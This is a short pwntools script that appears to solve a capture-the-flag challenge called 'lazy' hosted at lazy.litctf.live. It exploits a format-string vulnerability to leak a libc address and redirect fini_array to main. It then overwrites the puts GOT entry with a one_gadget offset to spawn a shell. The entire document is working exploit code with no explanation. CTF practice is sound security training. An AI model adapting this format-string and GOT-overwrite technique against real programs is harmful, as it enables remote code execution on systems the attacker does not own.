from pwn import *

#init

e = ELF('./lazy')
libc = ELF('./libc-2.31.so')

context.binary = e

#p = process(e.path)
p = remote('lazy.litctf.live', 1337)

#vars

main = e.sym['main']
fini_array = e.sym['__do_global_dtors_aux_fini_array_entry']
puts_got = e.got['puts']
strt_main_off = libc.sym['__libc_start_main']
one_gadget = 0xcbd1a 

log.info('Main adr: ' + hex(main))
log.info('Fini array adr: ' + hex(fini_array))
log.info('Puts got adr: ' + hex(puts_got))
log.info('Strt main libc off: ' + hex(strt_main_off))
log.info('One gadget libc off: ' + hex(one_gadget))

#exploit

#leak libc overwrite fini array to main

s = b'%71$p#'
s = s.ljust(8, b'a')
s += fmtstr_payload(7, {fini_array : main}, 17)

p.sendlineafter('?', s)

p.recvuntil(':\n')
libc_off = int(p.recvuntil('#', drop = True), 16) - strt_main_off - 234
p.recvuntil('.')

log.info('Libc off adr: ' + hex(libc_off))

#overwrite got with one gadget

s = fmtstr_payload(6, {puts_got : libc_off + one_gadget})

p.sendlineafter('?', s)

#pray for flag

p.interactive()


